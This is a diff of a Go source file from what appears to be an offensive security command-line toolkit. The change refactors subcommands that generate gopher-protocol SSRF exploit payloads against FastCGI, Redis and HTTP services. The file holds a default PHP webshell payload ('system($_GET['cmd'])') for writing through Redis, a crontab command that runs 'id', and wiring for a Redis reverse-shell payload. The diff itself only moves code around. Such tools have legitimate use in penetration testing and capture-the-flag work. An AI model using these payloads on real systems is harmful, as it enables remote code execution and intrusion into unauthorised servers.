@@ -1,13 +1,13 @@
-package main
+package gopher
 
 import (
 	"fmt"
 	"net/url"
 
+	"github.com/mozhu1024/virzz/common"
+	"github.com/mozhu1024/virzz/logger"
+	"github.com/mozhu1024/virzz/utils"
 	"github.com/spf13/cobra"
-	"github.com/virink/virzz/common"
-	"github.com/virink/virzz/utils"
-	"github.com/virink/virzz/web/gopher"
 )
 
 // fastCGICmd
@@ -24,7 +24,7 @@ var fastCGICmd = &cobra.Command{
 		if filename == "" {
 			filename = "/usr/share/php/PEAR.php"
 		}
-		r, err := gopher.ExpFastCGI(addr, command, filename)
+		r, err := expFastCGI(addr, command, filename)
 		if err != nil {
 			return err
 		}
@@ -61,7 +61,7 @@ var redisWriteCmd = &cobra.Command{
 		if content == "" {
 			content = "Hello world"
 		}
-		r, err := gopher.ExpRedisCmd(addr, filePath, filename, content)
+		r, err := expRedisCmd(addr, filePath, filename, content)
 		if err != nil {
 			return err
 		}
@@ -89,7 +89,7 @@ var redisWebshellCmd = &cobra.Command{
 		if content == "" {
 			content = "\r\n<?php system($_GET['cmd']);?>\r\n"
 		}
-		r, err := gopher.ExpRedisCmd(addr, filePath, filename, content)
+		r, err := expRedisCmd(addr, filePath, filename, content)
 		if err != nil {
 			return err
 		}
@@ -117,7 +117,7 @@ var redisReverseCmd = &cobra.Command{
 		if reverseAddr == "" {
 			return fmt.Errorf("must need Reverse Addr")
 		}
-		r, err := gopher.ExpRedisReverseShell(addr, filePath, filename, reverseAddr)
+		r, err := expRedisReverseShell(addr, filePath, filename, reverseAddr)
 		if err != nil {
 			return err
 		}
@@ -145,7 +145,7 @@ var redisCrontabCmd = &cobra.Command{
 		if content == "" {
 			content = "id > /var/www/html/virzz.txt"
 		}
-		r, err := gopher.ExpRedisCmd(addr, filePath, filename, content)
+		r, err := expRedisCrontabFile(addr, filePath, filename, content)
 		if err != nil {
 			return err
 		}
@@ -166,7 +166,7 @@ var httpPostCmd = &cobra.Command{
 		if len(datas) == 0 {
 			return cmd.Help()
 		}
-		r, err := gopher.ExpHTTPPost(host, uri, datas)
+		r, err := expHTTPPost(host, uri, datas)
 		if err != nil {
 			return err
 		}
@@ -188,10 +188,10 @@ var httpUploadCmd = &cobra.Command{
 			return err
 		}
 		if len(datas) == 0 {
-			common.Logger.Error("Require data by -d a=1 / a=@file")
+			logger.Error("Require data by -d a=1 / a=@file")
 			return cmd.Help()
 		}
-		r, err := gopher.ExpHTTPUpload(host, uri, datas)
+		r, err := expHTTPUpload(host, uri, datas)
 		if err != nil {
 			return err
 		}
@@ -213,7 +213,7 @@ var listenCmd = &cobra.Command{
 		if err != nil {
 			return err
 		}
-		r, err := gopher.ExpGopher(addr, port, times, quit)
+		r, err := expGopher(addr, port, times, quit)
 		if err != nil {
 			return err
 		}
@@ -239,9 +239,20 @@ var (
 	quit        bool
 )
 
+// GopherCmd -
+var GopherCmd = &cobra.Command{
+	Use:           "gopher",
+	Short:         "Generate Gopher Exp",
+	SilenceErrors: true,
+	SilenceUsage:  true,
+	RunE: func(cmd *cobra.Command, args []string) error {
+		return cmd.Help()
+	},
+}
+
 func init() {
-	rootCmd.PersistentFlags().CountVarP(&urlencode, "urlencode", "e", "URL Encode (-e , -ee -eee)")
-	rootCmd.PersistentFlags().StringVarP(&filename, "filename", "f", "", "Filename")
+	GopherCmd.PersistentFlags().CountVarP(&urlencode, "urlencode", "e", "URL Encode (-e , -ee -eee)")
+	GopherCmd.PersistentFlags().StringVarP(&filename, "filename", "f", "", "Filename")
 
 	fastCGICmd.Flags().StringVarP(&command, "command", "c", "id", "Command")
 	// fastCGICmd.Flags().StringVarP(&filename, "filename", "f", "", "Delimiter")
@@ -260,5 +271,7 @@ func init() {
 	listenCmd.Flags().BoolVarP(&quit, "quit", "q", false, "Redis Quit")
 
 	redisCmd.AddCommand(redisWriteCmd, redisWebshellCmd, redisCrontabCmd, redisReverseCmd)
-	rootCmd.AddCommand(fastCGICmd, redisCmd, httpPostCmd, httpUploadCmd, listenCmd)
+
+	GopherCmd.AddCommand(fastCGICmd, redisCmd, httpPostCmd, httpUploadCmd, listenCmd)
+	GopherCmd.SuggestionsMinimumDistance = 1
 }
